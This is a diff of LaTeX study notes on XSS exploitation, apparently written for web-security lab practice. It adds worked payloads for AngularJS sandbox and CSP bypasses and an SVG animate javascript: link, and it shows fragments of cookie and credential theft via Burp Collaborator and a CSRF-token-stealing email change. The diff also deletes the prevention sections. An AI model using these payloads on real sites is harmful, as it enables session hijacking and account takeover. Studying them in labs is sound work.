@@ -177,7 +177,7 @@ you can get the payload from github repos and it's something like
 
 \rule{15cm}{0.6pt}
 \section*{Exploiting cross-site scripting examples explainging}
-\textbf{Using Burp Suite Collaborator to Steal Cookies}
+\textbf{\underline{Using Burp Suite Collaborator to Steal Cookies}}
 \begin{enumerate}
 \item Using Burp Suite Professional, go to the \textbf{Collaborator tab}
 \item Click \texttt{"Copy to clipboard"} to copy a unique Burp Collaborator payload to your clipboard
@@ -199,7 +199,7 @@ you can get the payload from github repos and it's something like
 \item \texttt{mode: 'no-cors'} allows the request to be sent despite cross-origin restrictions
 \end{itemize}
 
-\textbf{Using Burp Suite Collaborator to Steal Login Credentials}
+\textbf{\underline{Using Burp Suite Collaborator to Steal Login Credentials}}
 \begin{enumerate}
 \item Using Burp Suite Professional, go to the \textbf{Collaborator tab}
 \item Click \texttt{"Copy to clipboard"} to copy a unique Burp Collaborator payload to your clipboard
@@ -214,6 +214,7 @@ fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
 \item Go back to the Collaborator tab, and click \texttt{"Poll now"}. You should see an HTTP interaction. If you don't see any interactions listed, wait a few seconds and try again
 \end{enumerate}
 
+\newpage
 \underline{How This Attack Works:}
 \begin{itemize}
 \item Creates fake username and password input fields on the vulnerable page
@@ -224,14 +225,9 @@ fetch('https://BURP-COLLABORATOR-SUBDOMAIN',
 \item Attacker can then use the stolen credentials to authenticate as the victim
 \end{itemize}
 
-\textbf{Security Impact:}
-\begin{itemize}
-\item \textbf{Session Hijacking}: Attacker gains full access to victim's account
-\item \textbf{Credential Theft}: Attacker captures login credentials for other systems
-\item \textbf{Identity Impersonation}: Attacker can perform actions as the victim
-\item \textbf{Data Breach}: Potential access to sensitive user data
-\end{itemize}
-\textbf{Exploiting XSS Vulnerabilities Using XSS.report website}
+\vspace{.25cm}
+\textbf{\underline{Exploiting XSS Vulnerabilities Using XSS.report website}}
+\vspace{.25cm}
 \\XSS.report automatically verifies if submitted payloads successfully execute, providing immediate confirmation of vulnerability validity without manual testing.
 
 \begin{lstlisting}[frame=single]
@@ -277,7 +273,7 @@ Exploitation Workflow:
     \rule{5cm}{0.4pt}
     \item if the Content Type header is "Content-Type: image/svg+xml; charset=us-ascii"
           then the website is likely vulnerable to XSS via SVG file\\
-          \rule{5cm}{0.4pt}
+
     \item if the WAF blocks $<$ and $>$ do not try to force using them Instead if it is
           inside "Input field" try a payload with an attribute like this
           \begin{lstlisting}[frame=single]
@@ -336,7 +332,7 @@ Exploitation Workflow:
   \\Google indexes: https://store.com/shoes as the main version
   \\SEO value goes to: https://store.com/shoes
   \\ \rule{5cm}{0.4pt}
-  \item \textbf{Payload Explaining} 
+  \item \textbf{\underline{Payload Explaining}}
   \\for this script inside index.html with angle brackets and double quotes HTML-encoded and single quotes escaped
   	        \begin{lstlisting}[frame=single]
 </section>
@@ -362,7 +358,8 @@ Which renders as HTML:
             \end{lstlisting}
             The browser sees this HTML and the single quote ' in the URL then Closes the src attribute at searchTerms=\ and XSS trigger by The remaining \verb|';alert()//"| \\
 \rule{5cm}{0.4pt}
-  \item \textbf{Payload Explaining}
+  \item \textbf{\underline{Payload Explaining}}
+  \vspace{0.25cm}
 \\the payload $\Longrightarrow$ \verb|http://foo?&apos;-alert(1)-&apos;|
 \vspace{5px}
 \\ \underline{Why It Worked:}
@@ -384,6 +381,7 @@ JavaScript Interpretation:
 'http://foo?' - alert(1) - ''
 \end{lstlisting}
 
+\newpage
 \underline{Execution Mechanism:}
 \begin{itemize}
 \item The \verb|-| operator triggers JavaScript type conversion
@@ -393,7 +391,7 @@ JavaScript Interpretation:
 \item Results in \verb|NaN| without breaking the script
 \end{itemize}
 \rule{5cm}{0.4pt}
-\item \textbf{Backticks in JS}
+\item \textbf{\underline{Backticks in JS}}
 \begin{lstlisting}[frame=single]
 <script> var message = `5 search results for ''`;
 document.getElementById('searchMessage').innerText = message; </script>
@@ -453,6 +451,7 @@ changeReq.send('csrf='+token+'&email=attacker@evil.com')
 </script>
 \end{lstlisting}
 
+
 \item \textbf{Why This Works}
 
 \subitem \textbf{CSRF Protection Bypass}
@@ -462,47 +461,244 @@ changeReq.send('csrf='+token+'&email=attacker@evil.com')
 \item \textbf{Result}: Malicious request appears legitimate
 \end{itemize}
 
-\subitem \textbf{Account Takeover Steps}
-\begin{enumerate}
-\item Victim views malicious comment
-\item Script runs with victim's session
-\item Steals CSRF token from victim's own account page
-\item Changes email to attacker-controlled address
-\item Attacker uses "password reset" to new email
-\item Complete account compromise
-\end{enumerate}
-
-\item \textbf{Key Points}
-
-\subitem \textbf{Attack Requirements}
-\begin{itemize}
-\item XSS vulnerability anywhere on site
-\item Sensitive function with CSRF protection
-\item CSRF token visible in page HTML
-\item No HttpOnly cookies for tokens
-\end{itemize}
-
-\subitem \textbf{Impact}
-\begin{itemize}
-\item Full account takeover
-\item Bypasses all CSRF protection
-\item Silent exploitation
-\item High severity
-\end{itemize}
-
-\subitem \textbf{Prevention}
-\begin{itemize}
-\item HttpOnly cookies for sensitive tokens
-\item Content Security Policy (CSP)
-\item Input validation + output encoding
-\item Separate authentication for sensitive actions
-\end{itemize}
-
 \item \textbf{Remember}
 CSRF tokens protect against cross-site requests, but XSS can steal them to make authorized malicious requests from the same site.\\
-\rule{5cm}{0.4pt}
+\rule{15cm}{0.4pt}
 
+\vspace{.25cm}
+
+\item \textbf{\Large Complex Sandbox Bypass Example:}
+
+\begin{lstlisting}[frame=single]
+/?search=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:
+toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+\end{lstlisting}
+
+\subsection*{Payload Breakdown}
+
+\textbf{1. String Prototype Pollution}
+\begin{lstlisting}[frame=single]
+toString().constructor.prototype.charAt=[].join
+\end{lstlisting}
+\begin{itemize}
+\item \texttt{toString().constructor} $\Longrightarrow$ \texttt{String} constructor function
+\item Overrides \texttt{String.prototype.charAt} with \texttt{Array.prototype.join}
+\item \textbf{Impact}: Breaks Angular's sandbox by modifying core string functions
+\end{itemize}
+
+\textbf{2. Character Code Obfuscation}
+\begin{lstlisting}[frame=single]
+fromCharCode(120,61,97,108,101,114,116,40,49,41)
+\end{lstlisting}
+\begin{itemize}
+\item Decodes to: \texttt{"x=alert(1)"}
+\item \textbf{Purpose}: Bypasses WAF detection using ASCII encoding
+\item Character mapping: 120=x, 61==, 97=a, 108=l, 101=e, 114=r, 116=t, 40=(, 49=1, 41=)
+\end{itemize}
+
+\textbf{3. OrderBy Filter Exploitation}
+\begin{lstlisting}[frame=single]
+[1]|orderBy:toString().constructor.fromCharCode(...)
+\end{lstlisting}
+\begin{itemize}
+\item Uses Angular's \texttt{orderBy} filter to execute JavaScript
+\item \texttt{toString().constructor} $\Longrightarrow$ \texttt{String} constructor $\Longrightarrow$ \texttt{eval} equivalent
+\item Executes: \texttt{x=alert(1)} when the filter processes the array
+\end{itemize}
+\item \textbf{Why toString().constructor?}
+\begin{lstlisting}[frame=single]
+toString().constructor = String constructor
+String.constructor = Function constructor (code execution!)
+\end{lstlisting}
+
+\item \textbf{Why [1]|orderBy:?}
+\begin{lstlisting}[frame=single]
+// orderBy can evaluate Angular expressions
+[1] | orderBy:'someExpression'
+\end{lstlisting}
+
+\item \textbf{Combining Both: The Exploit}
+\begin{lstlisting}[frame=single]
+[1] | orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,
+116,40,49,41)
+\end{lstlisting}
+\begin{enumerate}
+\item toString().constructor = String constructor
+\item String.fromCharCode(...) = Decodes to "x=alert(1)"
+\item orderBy processes this as JavaScript code
+\item Result: alert(1) executes
+\end{enumerate}
+
+
+\item \section*{AngularJS DOM XSS Exploit Analysis}
+
+\subsection*{Payload Breakdown}
+\begin{lstlisting}[frame=single]
+location='https://YOUR-LAB-ID.web-security-academy.net/?
+search=%3Cinput%20id=x%20ng-focus=$event.composedPath()|orderBy:%27
+(z=alert)(document.cookie)%27%3E#x';
+\end{lstlisting}
+
+\subsection*{URL Decoded Version}
+\begin{lstlisting}[frame=single]
+?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)
+(document.cookie)'>#x
+\end{lstlisting}
+
+\subsection*{Payload Analysis}
+
+
+\textbf{1. Input Element Creation}
+\begin{lstlisting}[frame=single]
+<input id=x ng-focus=...>
+\end{lstlisting}
+\begin{itemize}
+    \item Creates input field with ID \texttt{x}
+    \item Uses Angular directive \texttt{ng-focus} (triggers on focus)
+    \item \textbf{Bypasses CSP} by using Angular events instead of inline scripts
+\end{itemize}
+
+\textbf{2. Hash Fragment: \texttt{\#x}}
+\begin{lstlisting}[frame=single]
+#x
+\end{lstlisting}
+\begin{itemize}
+    \item Focuses element with \texttt{id="x"}
+    \item Triggers \texttt{ng-focus} event automatically
 \end{itemize}
 
 
+\textbf{3. \$event Object Reference}
+\begin{lstlisting}[frame=single]
+$event
+\end{lstlisting}
+\begin{itemize}
+    \item \textbf{AngularJS variable} referencing the DOM event object
+    \item Provides access to event properties and methods
+\end{itemize}
+
+\textbf{4. composedPath() Method}
+\begin{lstlisting}[frame=single]
+$event.composedPath()
+// Returns: [input#x, body, html, document, window]
+\end{lstlisting}
+\begin{itemize}
+    \item \textbf{Chrome-specific property} (formerly \texttt{\$event.path})
+    \item Returns array of elements in \textbf{event propagation path}
+    \item \textbf{Last element = window object} - Critical for the exploit!
+\end{itemize}
+
+\subsection*{The Filter Chain Exploit}
+
+\textbf{\texttt{| orderBy} Filter Operation}
+\begin{lstlisting}[frame=single]
+// Normally: array | orderBy:expression
+[1,2,3] | orderBy:'property'
+
+// Exploit: event path | orderBy:malicious code
+$event.composedPath() | orderBy:'(z=alert)(document.cookie)'
+\end{lstlisting}
+
+\textbf{Why This Bypasses Angular Security}
+\begin{lstlisting}[frame=single]
+// Angular's window check blocks:
+orderBy:'window.alert(1)'  // BLOCKED - explicit window reference
+
+// But this bypasses:
+orderBy:'(z=alert)(1)'     // WORKS - no explicit window reference
+\end{lstlisting}
+
+\subsection*{Execution Flow Analysis}
+
+\textbf{Step 1: Event Path Array}
+\begin{lstlisting}[frame=single]
+$event.composedPath() = [input, body, html, document, window]
+\end{lstlisting}
+
+\textbf{Step 2: orderBy Processing}
+\begin{itemize}
+    \item \texttt{orderBy} iterates through each element in path
+    \item When it reaches \textbf{window object} (last element):
+    \item \texttt{orderBy} evaluates \texttt{'(z=alert)(document.cookie)'} in window context
+\end{itemize}
+
+\textbf{Step 3: Code Execution}
+\begin{lstlisting}[frame=single]
+(z=alert)(document.cookie)
+// Breakdown:
+z = alert;           // alert is window.alert (implicit)
+z(document.cookie);  // Executes in window scope
+\end{lstlisting}
+
+\rule{15cm}{0.4pt}
+
+\section*{What if event handlers and href attributes blocked}
+
+\textbf{\underline{Try SVG Animation XSS Payload}}
+
+\subsection*{Payload Structure}
+\begin{lstlisting}[frame=single]
+<svg>
+  <a>
+    <animate attributeName=href values=javascript:alert(1) />
+    <text x=20 y=20>Click me</text>
+  </a>
+</svg>
+\end{lstlisting}
+
+\subsection*{Component Breakdown}
+
+\textbf{1. SVG Container}
+\begin{lstlisting}[frame=single]
+<svg>
+\end{lstlisting}
+\begin{itemize}
+    \item Creates SVG namespace context
+    \item Often allowed through HTML filters that block regular scripts
+\end{itemize}
+
+\textbf{2. Anchor Element Inside SVG}
+\begin{lstlisting}[frame=single]
+<a>
+\end{lstlisting}
+\begin{itemize}
+    \item Creates clickable link within SVG
+    \item SVG \texttt{<a>} elements behave like HTML links but with different parsing rules
+\end{itemize}
+
+\textbf{3. Animate Element (The Exploit)}
+\begin{lstlisting}[frame=single]
+<animate attributeName=href values=javascript:alert(1) />
+\end{lstlisting}
+\begin{itemize}
+    \item \texttt{<animate>}: SVG animation element
+    \item \texttt{attributeName=href}: Targets the href attribute of parent \texttt{<a>} element
+    \item \texttt{values=javascript:alert(1)}: Sets the href to \texttt{javascript:alert(1)}
+    \item Dynamically changes the link to execute JavaScript when clicked
+\end{itemize}
+
+\textbf{4. Text Element}
+\begin{lstlisting}[frame=single]
+<text x=20 y=20>Click me</text>
+\end{lstlisting}
+\begin{itemize}
+    \item Creates visible text "Click me" at position (20,20)
+    \item Makes the exploit user-triggered (requires click)
+\end{itemize}
+
+\subsection*{Execution Mechanism}
+
+\textbf{Step-by-Step Process:}
+\begin{enumerate}
+    \item \textbf{Page loads} with SVG containing the malicious animation
+    \item \textbf{Animation immediately runs} and sets the \texttt{<a>} href to \texttt{javascript:alert(1)}
+    \item \textbf{User sees} "Click me" text
+    \item \textbf{User clicks} the link
+    \item \texttt{alert(1)} executes in browser context
+\end{enumerate}
+
+
+
+
+\end{itemize}
 \end{document}
